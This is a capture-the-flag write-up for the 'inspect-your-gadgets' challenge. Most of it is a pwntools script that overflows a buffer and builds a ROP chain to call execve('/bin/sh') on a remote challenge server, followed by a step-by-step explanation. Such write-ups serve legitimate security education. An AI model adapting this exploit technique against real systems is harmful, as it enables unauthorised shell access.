# Summary 
In this challenge we have to reverse a binary an build up a ROP chain in order to open a shell on the computer and read the flag. In order to do this we need to setup a syscall to bin/sh through the buffer overflow in the program. 

# Payload
Here is the script 
```python
from pwn import * 

if __name__ == "__main__":
    # p = process("./inspect-your-gadgets")
    p = remote("chal.ctf-league.osusec.org", 1311)
    
    # get all the questions right :)
    p.sendlineafter(b"here: ", b"C")
    p.sendlineafter(b"here: ", b"D")
    p.sendlineafter(b"here: ", b"A")
    
    pop_rdx = p64(0x4018cf)
    pop_rsi = p64(0x40f52e)
    bss_addr = p64(0x4c3220 + 9)
    
    # construct rop payload
    payload = b"A"*0x28 # buffer overflow
    
    # set up rax
    payload += pop_rdx # pop rdx; ret
    payload += p64(59)
    payload += p64(0x447e48) # mov rax, rdx; ret
    
    # set up rdi (/bin/sh)
    payload += p64(0x4019c2) # pop rdi; ret
    payload += bss_addr
    payload += p64(0x404bd2) # pop rcx ; ret
    payload += b"/bin/sh\x00" # p64(0x2F2F62696E2F7368) "/bin/sh"
    payload += p64(0x43b95b) # mov qword ptr [rdi], rcx ; ret
    
    # zero rsi
    payload += pop_rdx # pop rdx; ret
    payload += p64(0)
    payload += pop_rsi # pop rsi ; ret
    payload += p64(0)

    # syscall
    payload += p64(0x4012d3) # syscall

    print(payload)
    
    # send payload!
    p.sendlineafter(b"scoreboard: ", payload)
    p.interactive()
```
A step by step example of this script would be awnsering the questions correctly then initiating the buffer overflow. From here we use gadgets to set up rax through pops and returns to contiue our ROP chain, from there we setup rdi where we put the string bin/sh into a area of the program that is constant and setup a ptr to that address that we can access later. From there we make rsi equal to zero. Finally we have our syscall setup, which we use with our setup values to call a shell which will then allows us to cat the flag file on the machine. 